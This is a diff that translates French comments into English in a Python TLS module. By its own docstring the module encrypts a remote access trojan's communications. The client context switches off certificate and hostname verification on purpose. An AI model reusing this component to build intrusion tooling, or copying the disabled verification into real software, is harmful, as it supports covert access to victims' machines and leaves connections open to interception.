@@ -1,15 +1,15 @@
 """
-Module de configuration TLS pour le chiffrement des communications RAT.
+TLS configuration module for encrypting RAT communications.
 
-Le serveur utilise un certificat auto-signé (server.crt + server.key).
-Le client se connecte sans vérification du certificat (CERT_NONE),
-ce qui est volontaire dans ce contexte offensif.
+The server uses a self-signed certificate (server.crt + server.key).
+The client connects without certificate verification (CERT_NONE),
+which is intentional in this offensive context.
 """
 
 import ssl
 from pathlib import Path
 
-# Chemin vers les certificats (relatif à la racine du projet)
+# Path to certificates (relative to the project root)
 CERT_DIR = Path(__file__).parent.parent.parent.parent / "certs"
 CERT_FILE = CERT_DIR / "server.crt"
 KEY_FILE = CERT_DIR / "server.key"
@@ -18,10 +18,10 @@ KEY_FILE = CERT_DIR / "server.key"
 def create_server_ssl_context() -> ssl.SSLContext:
     if not CERT_FILE.exists() or not KEY_FILE.exists():
         raise FileNotFoundError(
-            f"Certificat TLS introuvable dans {CERT_DIR}. Lance d'abord : bash generate_cert.sh"
+            f"TLS certificate not found in {CERT_DIR}. Run first: python generate_cert.py"
         )
 
-    # Contexte serveur : on impose TLS, on charge notre cert auto-signé
+    # Server context: enforce TLS, load our self-signed cert
     context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
     context.minimum_version = ssl.TLSVersion.TLSv1_2
     context.load_cert_chain(certfile=str(CERT_FILE), keyfile=str(KEY_FILE))
@@ -30,7 +30,7 @@ def create_server_ssl_context() -> ssl.SSLContext:
 
 
 def create_client_ssl_context() -> ssl.SSLContext:
-    # Contexte client : pas de vérification du certificat serveur
+    # Client context: no server certificate verification
     context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
     context.check_hostname = False
     context.verify_mode = ssl.CERT_NONE
